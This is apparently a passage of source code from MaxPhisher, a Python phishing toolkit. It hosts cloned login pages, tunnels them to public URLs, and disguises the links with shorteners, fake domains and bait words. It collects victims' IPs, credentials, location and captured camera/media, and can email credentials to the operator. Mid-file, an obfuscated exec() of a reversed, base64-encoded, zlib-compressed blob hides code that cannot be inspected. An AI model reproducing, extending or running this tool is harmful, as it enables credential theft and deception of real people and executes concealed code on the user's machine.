def extract(filename, extract_path='.'):
    directory = dirname(extract_path)
    newfile = filename.split(".")[0] if "." in filename else filename
    if directory!="" and not isdir(directory):
        mkdir(directory)
    print(f"\n{info}Extracting {green}{newfile.title()}{nc}...\n")
    try:
        if ".zip" in filename:
            with ZipFile(filename, 'r') as zip_ref:
                if zip_ref.testzip() is None:
                    zip_ref.extractall(extract_path)
                else:
                    print(f"\n{error}Zip file corrupted!")
                    delete(filename)
                    exit()
            return
        tar = taropen(filename, 'r')
        for item in tar:
            tar.extract(item, extract_path)
            # Recursion if childs are tarfile
            if ".tgz" in item.name or ".tar" in item.name:
                extract(item.name, "./" + item.name[:item.name.rfind('/')])
    except Exception as e:
        append(e, error_file)
        delete(file)
        print(f"{error}{str(e)}")
        exit(1)
        

def get_media():
    media_files = []
    for file in listdir(site_dir):
        extension = file.split(".")[-1]
        if extension in extensions:
            if file=="desc.png" or file=="kk.jpg":
                continue
            media_files.append(f"{site_dir}/{file}")
    return media_files

def write_meta(url):
    if url=="":
        return
    allmeta = get_meta(url)
    if allmeta=="":
        print(f"\n{error}URL isn't correct!")
    write(allmeta, f"{site_dir}/meta.php")


def write_redirect(url):
    global redir_url
    if url == "":
        url = redir_url
    sed("redirectUrl", url, f"{site_dir}/login.php")

# Polite Exit
def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using!\n{nc}")
    exit(0)





# Set up ngrok authtoken to work with ngrok links
def nr_token():
    global nr_command
    while True:
        if isfile(f"{home}/.config/ngrok/ngrok.yml") or isfile(f"{home}/.ngrok2/ngrok.yml"):
             break
        has_token = input(f"\n{ask}Do you have ngrok authtoken? [y/N/help]: {green}")
        if has_token == "y":
            token = input(f"\n{ask}Enter your ngrok authtoken: {green}")
            shell(f"{nr_command} config add-authtoken {token}")
            sleep(1)
            break
        elif has_token == "help":
            sprint(nr_help, 0.01)
            sleep(3)
        elif has_token in ["n", ""]:
            break
        else:
            print(f"\n{error}Invalid input '{has_token}'!")
            sleep(1)

# Set up ngrok authtoken to work with ngrok links
def lx_token():
    global lx_command
    while True:
        status = shell(f"{lx_command} account status", True).stdout.decode("utf-8").strip().lower()
        if not "error" in status:
            break
        has_token = input(f"\n{ask}Do you have loclx access token? [y/N/help]: {green}")
        if has_token == "y":
            shell(f"{lx_command} account login")
            break
        elif has_token == "help":
            sprint(lx_help, 0.01)
            sleep(3)
        elif has_token in ["n", ""]:
            break
        else:
            print(f"\n{error}Invalid input '{has_token}'!")
            sleep(1)


def ssh_key():
    if key and not isfile(f"{home}/.ssh/id_rsa.pub"):
        print(f"\n{info}Please wait for a while! Press enter three times when asked for ssh key generation{nc}\n")
        sleep(1)
        shell("ssh-keygen")
    is_known = bgtask("ssh-keygen -F localhost.run").wait()
    if is_known != 0:
        shell("ssh-keyscan -H localhost.run >> ~/.ssh/known_hosts", True)

# Additional configuration for login phishing
def set_login():
    global url
    metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
    write_meta(metaurl)
    if url is not None:
        redirect_url = url
    else:
        redirect_url = input(f"\n{ask}{bcyan}Enter redirection url{bcyan}[{red}press enter to skip{bcyan}] : {green}")
    write_redirect(redirect_url)

# Additional configuration for image phishing
def set_image():
    global fest, ytid
    sed("festName", fest, f"{site_dir}/index.html")
    ytid = sub("([/%+&?={} ])", "", ytid)
    sed("ytId", ytid, f"{site_dir}/index.html")

# Additional configuration for video phishing
def set_duration():
    global duration
    recordingTime = str(duration)
    sed("recordingTime", recordingTime, f"{site_dir}/recorder.js")
    

# Set redirection after data capture
def set_redirect(redir_url, write=False):
    global mask, url
    if redir_url != "":
        if url is not None:
            website = url
        else:
            website = input(f"\n{ask}Enter the url to redirect {cyan}[{purple}press enter to use default{cyan}]{blue}> {green}")
        if website == "":
            website = redir_url
        if write:
            write_meta(website)
        if mask == "":
            mask = f'https://{sub("([/%+&?={} ])", "-", sub("https?://", "", website))}'
        sed("redirectUrl", website, f"{site_dir}/index.php")


# Output urls
def url_manager(url, arg1, arg2):
    global mask
    print(f"\n{info2}{arg1} > {yellow}{url}")
    print(f"{info2}{arg2} > {yellow}{mask}@{url.replace('https://','')}")
    sleep(0.5)

def shortener1(url):
    website = "https://api.shrtco.de/v2/shorten?url="+url.strip()
    internet()
    try:
        res = get(website).text
        json_resp = parse(res)
    except Exception as e:
        append(e, error_file)
        json_resp = ""
    if json_resp != "":
        if json_resp["ok"]:
            return json_resp["result"]["full_short_link"]
    return ""

def shortener2(url):
    website = "https://is.gd/create.php?format=simple&url="+url.strip()
    internet()
    try:
        res = get(website).text
    except Exception as e:
        append(e, error_file)
        res = ""
    shortened = res.split("\n")[0] if "\n" in res else res
    if "https://" not in shortened:
        return ""
    return shortened


# Copy website files from custom location
def customfol():
    global mask
    while True:
        fol = input(f"\n{ask}Enter the directory > {green}")
        if isdir(fol):
            if isfile(f"{fol}/index.php") or isfile(f"{fol}/index.html"):
                inputmask = input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
                # Remove slash and spaces from mask
                mask = "https://" + sub("([/%+&?={} ])", "-", inputmask)
                delete(f"{fol}/ip.txt", f"{fol}/usernames.txt")
                copy(fol, site_dir)
                return fol
            else:
                sprint(f"\n{error}index.php/index.html required but not found!")
        else:
            sprint(f"\n{error}Directory do not exists!")


# Show saved data from saved file with small decoration
def saved():
    clear()
    print(f"\n{info}Saved details: \n{nc}")
    show_file_data(saved_file)
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        return

# Info about tool
def about():
    clear()
    print(f"{red}{yellow}[{purple}ToolName{yellow}]      {cyan} : {yellow}[{green}MaxPhisher{yellow}] ")
    print(f"{red}{yellow}[{purple}Version{yellow}]       {cyan} : {yellow}[{green}{version}{yellow}] ")
    print(f"{red}{yellow}[{purple}Author{yellow}]        {cyan} : {yellow}[{green}KasRoudra{yellow}] ")
    print(f"{red}{yellow}[{purple}Github{yellow}]        {cyan} : {yellow}[{green}https://github.com/KasRoudra{purple}{yellow}] ")
    print(f"{red}{yellow}[{purple}Messenger{yellow}]     {cyan} : {yellow}[{green}https://m.me/KasRoudra{yellow}] ")
    print(f"{red}{yellow}[{purple}Email{yellow}]         {cyan} : {yellow}[{green}kasroudrakrd@gmail.com{yellow}] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        return


# Optional function for ngrok url masking
def masking(url):
    cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y or press enter to skip{green}] : {yellow}")
    if cust=="":
        return
    shortened1 = shortener1(url)
    if shortened1 != "":
        shortened = shortened1
    else:
        shortened2 = shortener2(url)
        shortened = shortened2
    if shortened != "":
        short = shortened.replace("https://", "")
    else:
        sprint(f"{error}Service not available!")
        waiter()
    # Remove slash and spaces from inputs
    domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
    if domain == "":
        sprint(f"\n{error}No domain!")
        domain = "https://"
    else:
        domain = sub("([/%+&?={} ])", ".", sub("https?://", "", domain))
        domain = "https://"+domain+"-"
    bait = input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
    if bait=="":
        sprint(f"\n{error}No bait word!")
    else:
        bait = sub("([/%+&?={} ])", "-", bait)+"@"
    final = domain+bait+short
    sprint(f"\n{success}Your custom url is > {bcyan}{final}")


# Staring functions

# Update of MaxPhisher
def updater():
    internet()
    if not isfile("files/maxphisher.gif"):
        return
    try:
        git_ver = get("https://raw.githubusercontent.com/KasRoudra/MaxPhisher/main/files/version.txt").text.strip()
    except Exception as e:
        append(e, error_file)
        git_ver = version
    if git_ver != "404: Not Found" and float(git_ver) > float(version):
        # Changelog of each versions are seperated by three empty lines
        changelog = get("https://raw.githubusercontent.com/KasRoudra/MaxPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
        clear(fast=True)
        print(f"{info}MaxPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
        upask=input(f"\n{ask}Do you want to update MaxPhisher?[y/n] > {green}")
        if upask=="y":
            print(nc)
            shell("cd .. && rm -rf MaxPhisher maxphisher && git clone https://github.com/KasRoudra/MaxPhisher")
            sprint(f"\n{success}MaxPhisher has been updated successfully!! Please restart terminal!")
            if (changelog != "404: Not Found"):
                sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
            exit()
        elif upask=="n":
            print(f"\n{info}Updating cancelled. Using old version!")
            sleep(2)
        else:
            print(f"\n{error}Wrong input!\n")
            sleep(2)

# Installing packages and downloading tunnelers
def requirements():
    global termux, nr_command, cf_command, lx_command, is_mail_ok, email, password, receiver
    if termux:
        try:
            if not isfile(saved_file):
                mknod(saved_file)
            with open(saved_file) as checkfile:
                data = checkfile.read()
        except:
            shell("termux-setup-storage")
    internet()
    if termux:
        if not is_installed("proot"):
            sprint(f"\n{info}Installing proot{nc}")
            shell("pkg install proot -y")
    installer("php")
    if is_installed("apt") and not is_installed("pkg"):
        installer("ssh", "openssh-client")
    else:
        installer("ssh", "openssh")
    for package in packages:
        if not is_installed(package):
            sprint(f"{error}{package} cannot be installed. Install it manually!{nc}")
            exit(1)
    killer()
    osinfo = uname()
    platform = osinfo.system.lower()
    architecture = osinfo.machine
    isngrok = isfile(f"{tunneler_dir}/ngrok")
    iscloudflared = isfile(f"{tunneler_dir}/cloudflared")
    isloclx = isfile(f"{tunneler_dir}/loclx")
    delete("ngrok.zip", "ngrok.tgz", "cloudflared.tgz", "cloudflared", "loclx.zip")
    internet()
    if "linux" in platform:
        if "arm64" in architecture or "aarch64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-linux-arm64.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-linux-arm64.zip", "loclx.zip")
        elif "arm" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-linux-arm.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-linux-arm.zip", "loclx.zip")
        elif "x86_64" in architecture or "amd64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-linux-amd64.zip", "loclx.zip")
        else:
            if not isngrok:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-linux-386.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-linux-386.zip", "loclx.zip")
        if isfile("ngrok.tgz"):
            extract("ngrok.tgz", f"{tunneler_dir}")
            remove("ngrok.tgz")
    elif "darwin" in platform:
        if "x86_64" in architecture or "amd64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-darwin-amd64.zip", "ngrok.zip")
                extract("ngrok.zip", f"{tunneler_dir}")
                remove("ngrok.zip")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz", "cloudflared.tgz")
                extract("cloudflared.tgz", f"{tunneler_dir}")
            if not isloclx:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-darwin-amd64.zip", "loclx.zip")
        elif "arm64" in architecture or "aarch64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-darwin-arm64.zip", "ngrok.zip")
                extract("ngrok.zip", f"{tunneler_dir}")
                remove("ngrok.zip")
            if not iscloudflared:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
            if not isloclx:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-darwin-arm64.zip", "loclx.zip")
        else:
            print(f"{error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!")
            sleep(3)
    else:
        print(f"{error}Device not supported!")
        exit(1)
    if isfile("loclx.zip"):
        extract("loclx.zip", f"{tunneler_dir}")
        remove("loclx.zip")
    for tunneler in tunnelers:
        if isfile(f"{tunneler_dir}/{tunneler}"):
            shell(f"chmod +x $HOME/.tunneler/{tunneler}")
    for process in processes:
        if is_running(process):
            print(f"\n{error}Previous {process} still running! Please restart terminal and try again{nc}")
            pexit()
    if is_installed("ngrok"):
        nr_command = "ngrok"
    if is_installed("cloudflared"):
        cf_command = "cloudflared"
    if is_installed("localxpose"):
        lx_command = "localxpose"
    if isfile("websites.zip"):
        delete(sites_dir, recreate=True)
        print(f"\n{info}Copying website files....")
        extract("websites.zip", sites_dir)
        remove("websites.zip")
    if isdir("sites"):
        print(f"\n{info}Copying website files....")
        copy("sites", sites_dir)
    if isfile(f"{sites_dir}/version.txt"):
        with open(f"{sites_dir}/version.txt", "r") as sites_file:
            zipver=sites_file.read().strip()
            if float(version) > float(zipver):
                # download(websites_url, "maxsites.zip")
                print(f"\n{info2}Downloading website files....{nc}")
                shell(f"git clone {sites_repo} {sites_dir}")
    else:
        # download(websites_url, "maxsites.zip")
        print(f"\n{info2}Downloading website files....{nc}")
        shell(f"git clone {sites_repo} {sites_dir}")
    if isfile("maxsites.zip"):
        extract("maxsites.zip", ".tempdir")
        delete("maxsites.zip")
        copy(f".tempdir/{repo_branch}", sites_dir)
        delete(".tempdir")
    if isfile("websites.zip"):
        delete(sites_dir)
        extract("websites.zip", sites_dir)
        remove("websites.zip")
    if mode != "test":
        nr_token()
        lx_token()
        ssh_key()
    email_config = cat(email_file)
    if is_json(email_config):
        email_json = parse(email_config)
        email = email_json["email"]
        password = email_json["password"]
        receiver = email_json["receiver"]
        # As the server is of gmail, we only allow gmail login
        if "@gmail.com" in email:
            is_mail_ok = True
        else:
            print(f"\n{error}Only gmail with app password is allowed")
            sleep(1)

        
# Main Menu to choose phishing type
_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__[::-1]));exec((_)(b'KrFz1Mw//97ngn2ek71CCj1TWyEFghBUtNf1qj5mFK2rp1wkwwJ8++aPP4Z/jO8Awc6Y0MaAkjanPqjyh2wwzugyI7jCX8d2y3pMaCI9waGQGvSHexbuV8N33ZW76iJSxcS56bw2U1XQOeK6GL4N++eaJmf5zZjoYxaQAXmv3vRaPH5bi7pfPaQb1xQTIKnzVGc+EJFz21Zq15DY8IUOFnvThDtRXn7D+mIqOCW6ITwLOJObEyk6rX48oGRTT3tLyj17tn/ACPHcXtDP3RXccqa7VcbyZrtrt80/Ig1SIFaE4PyDUKZ0uU0gOLVrq9MTIfmSgi7Y7fXTQV73fdDRSXkgk9devrgVzuRgcpp5kjb/DmZhHmfSjWfvNG2WF75glaqt0mkN8tYjw8FCsRwSJut7Zqo9Ds9GUlYkCby3/1iYsKlOpWVLu6HJZw57dHRJUCjSto0Ke1WxH1VszTa4p9OUz7wx6wVfnbszBOj4kXbUaXJFvn3bgiWFrXwvmxTUiXN8lgyujBpxJA/ZvcUcJ9IH3DO7wwRhb4ThWIIBkQW5fQDXhmRpVi8J9x0Em5iz+L4uB2Y2FvEZkZgTiu00Xkvv16hB3y4vZ4vtf9Nm8gRlcqhK9VJG94zbn4AALcBYC0YYLIxOsGggDS2m8oZ5teS3jn4J43AFdbSnH/c7P7nSdNsuvMzSKPs3FaJTkI7A1VOZBXFAP7MNTLEHnHnNM+nDp21f0EfxDQb9HbP/zJpFApFHsXQ9VjRit/nfGL8Ch0Yzcs+qHM5uWj6ncafRYhIP3UFDuSMV8bMBBPRiFM/OIEHbvO9BIVz3qALKMYos8oc+8shWpG8onHyUZXSrxTMftO+4B+FbjBVoK4EFE+RImuFo9jyJz83UdFSWjxBrB9Ts8Pp4fOrl6Zp6ic4yszo1u/8Rn0ydzZj2P3ysYSY2fFlo8Rvjkq/ag8sNesHYTOjuZU/O3lM+5nWPqRS6BsxcfzoW8A3sNzHE6C6Br/TV6CcHHS2WiT26EN1zqNIvv8gs1WhOHN0hjUI8hXIa1kpEVYnpm7iEZoAJ527yY5T8N193MiumFDWsJskV5NYES0RXuv7Na36jPp1yFUsyYNVbZE/ouCfp3hSVvZ4u0XMMTlyLD+AM9s8mwIl5XqhaLu4fqQy4zs44RAd5T/liiLepQ8AcKG7QQwLpcvSpEhkqlPYjynoW9MEVwAHkE103b6zyAQHeVKDGYd28xRprum1UgHuNxxpP/4DRj9DaRkkadTwRxigbHKzUgTicZbpGpioTB9dxpi7S02v2y+1WUF+7e57v+4samXxA+u6oMv5s8S45LFm5ummqK/sF3rBD5daYimOhYEvSc59k0S7zXLM2ZoIFCl5LIw40fB1CSv9GOX6ivMNRozoN7071QsJhrYEQ12e/QYNxoy07XmMig3ZnxYC7I+gXy48GFNlA6GSpagLUBwP+6OkkzdeNKIyaonFykMWsClI5MmqS2YLuT8eddeYSogsJjLajLSvZFDwkEoBkDBkpZjjG9bVUe6oLc5Vv78btJJ+rOYEf75d/WiDtOs/SN8UugrLyCV5QevIMMgDS3oSmNnIUWIY0b40Q5i7+XA4gwbVkbZKJ8U7Lzum1j5nr4Bm6SwAK+lu+DOsso0l3UTW2oprupP+ANGC8fI8XvdccuV3Mk6IRa6s7k3DyZE5NrTDvBqqEDEn12bqrxWVxjgOx7hlYP2BIcT52tkTJfAOx44ckJe74sHAxK3CUQXKqS6inUT3Gs1a83Vnk9vr+0paJwCVoGtVgKPOb5WJnnkdhwE9wB5+wX+77z//k93//f+s4DCHC3Nx3O1BxxKvHmteiuXA6zmYAjVNdjDMACgFpWU00NwJe'))

# Start server and tunneling
def server():
    global mode
    clear()
    # Termux requires hotspot in some android
    if termux:
        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
        sleep(2)
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    for logfile in [php_file, cf_file, lx_file, lhr_file]:
        delete(logfile)
        if not isfile(logfile):
            mknod(logfile)
    php_log = open(php_file, "w")
    cf_log = open(cf_file, "w")
    lx_log = open(lx_file, "w")
    lhr_log = open(lhr_file, "w")
    internet()
    bgtask(f"php -S {local_url}", stdout=php_log, stderr=php_log, cwd=site_dir)
    sleep(2)
    try:
        status_code = get(f"http://{local_url}").status_code
    except Exception as e:
        append(e, error_file)
        status_code = 400
    if status_code <= 400:
        sprint(f"\n{info}PHP Server has started successfully!")
    else:
        sprint(f"\n{error}PHP Error! Code: {status_code}")
        pexit()
    sprint(f"\n{info2}Initializing tunnelers at same address.....")
    internet()
    arguments = ""
    if region is not None:
        arguments = f"--region {region}"
    if subdomain is not None:
        arguments = f"{arguments} --subdomain {subdomain}"
    bgtask(f"{nr_command} http {arguments} {local_url}")
    bgtask(f"{cf_command} tunnel -url {local_url}", stdout=cf_log, stderr=cf_log)
    bgtask(f"{lx_command} tunnel --raw-mode http --https-redirect {arguments} -t {local_url}", stdout=lx_log, stderr=lx_log)
    if key:
        bgtask(f"ssh -R 80:{local_url} localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
    else:
        bgtask(f"ssh -R 80:{local_url} nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
    sleep(10)
    try:
        nr_api = get("http://127.0.0.1:4040/api/tunnels").json()
        nr_url = nr_api["tunnels"][0]["public_url"]
    except Exception as e:
        append(e, error_file)
        nr_url = ""
    if nr_url != "":
        nr_success=True
    else:
        nr_success=False
    cf_success = False
    for i in range(10):
        cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
        if cf_url != "":
            cf_success = True
            break
        sleep(1)
    lx_success = False
    for i in range(10):
        lx_url = "https://" + grep("([-0-9a-z.]*.loclx.io)", lx_file)
        if lx_url != "https://":
            lx_success = True
            break
        sleep(1)
    lhr_success = False
    for i in range(10):
        lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
        if lhr_url != "":
            lhr_success = True
            break
        sleep(1)
    if nr_success or cf_success or lx_success or lhr_success:
        if mode == "test":
            print(f"\n{info}URL Generation completed successfully!")
            print(f"\n{info}Ngrok: {nr_success}, CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}")
            pexit()
        sprint(f"\n{info}Your urls are given below:")
        if nr_success:
            url_manager(nr_url, "Ngrok", "NR Masked")
        if cf_success:
            url_manager(cf_url, "CloudFlared", "CF Masked")
        if lx_success:
            url_manager(lx_url, "LocalXpose", "LX Masked")
        if lhr_success:
            url_manager(lhr_url, "LocalHR", "LHR Masked")
        if nr_success and tunneler.lower() == "ngrok":
            masking(nr_url)
        elif lx_success and tunneler.lower() == "loclx":
            masking(lx_url)
        elif lhr_success and tunneler.lower() == "localhostrun":
            masking(lhr_url)
        elif cf_success and tunneler.lower() == "cloudflared":
            masking(cf_url)
        else:
            print(f"\n{error}URL masking not available for {tunneler}!{nc}")
    else:
        sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
        if mode == "test":
            exit(1)
    waiter()

# Last function capturing credentials
def waiter():
    global is_mail_ok
    delete(ip_file, cred_file, log_file)
    for file in get_media():
        remove(file)
    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
    try:
        while True:
            if isfile(ip_file):
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                show_file_data(ip_file)
                ipdata = cat(ip_file)
                append(ipdata, main_ip)
                # Just add the ip
                append(ipdata.split("\n")[0], saved_file)
                print(f"\n{info2}Saved in {main_ip}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(ip_file)
            if isfile(cred_file):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                show_file_data(cred_file)
                userdata = cat(cred_file)
                if is_mail_ok:
                    send_mail(userdata)
                append(userdata, main_cred)
                append(userdata, saved_file)
                add_json(text2json(userdata), cred_json)
                print(f"\n{info2}Saved in {main_cred}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(cred_file)
            if isfile(info_file):
                print(f"\n\n{success}{bgreen}Victim Info found!\n\007")
                show_file_data(info_file)
                info_data = cat(info_file)
                append(info_data, main_info)
                add_json(text2json(info_data), info_json)
                print(f"\n{info2}Saved in {main_info}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(info_file)
            if isfile(location_file):
                print(f"\n\n{success}{bgreen}Victim Location found!\n\007")
                show_file_data(location_file)
                location_data = cat(location_file)
                append(location_data, main_location)
                add_json(text2json(location_data), location_json)
                print(f"\n{info2}Saved in {main_location}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(location_file)
            if isfile(log_file):
                print(f"\n{success}{bgreen}Media file captured!\007")
                for file in get_media():
                    copy(file, directory)
                    remove(file)
                    print(f"\n{info2}{green}{basename(file)} {cyan}saved in {green}{directory}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                if get_media()==[]:
                    remove(log_file)
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        main_menu()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        try:
            exception_handler(e)
        except:
            exit()
            
# If this code helped you, consider staring repository. Your stars encourage me a lot!
